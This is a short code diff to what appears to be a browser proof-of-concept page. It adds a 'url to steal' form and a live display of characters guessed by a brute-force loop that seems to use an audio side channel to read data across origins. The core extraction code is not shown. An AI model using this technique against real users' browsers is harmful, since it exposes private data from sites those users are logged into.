@@ -1,3 +1,10 @@
+<form onsubmit="location='?'+url.value;return false;">
+<input type=url name=url placeholder='url to steal' autofocus onfocus='if(this.value==""&&location.search.length>0)this.value=location.search.slice(1)'>
+<input type=submit>
+</form>
+Guess:<br/>
+<span id="computed"></span>
+<hr/>
 <audio autoplay></audio>
 <script>
 audio=document.querySelector('audio');
@@ -96,6 +103,9 @@ stop=false;
 function bf() {
   var offset = 1;
   var buffer = [];
+  setInterval(function() {
+    document.querySelector('#computed').innerText=String.fromCharCode.apply(String, buffer);
+  }, 100);
   var loop = function() {
     if(stop)return;
     getChar(offset).then(function(answer) {
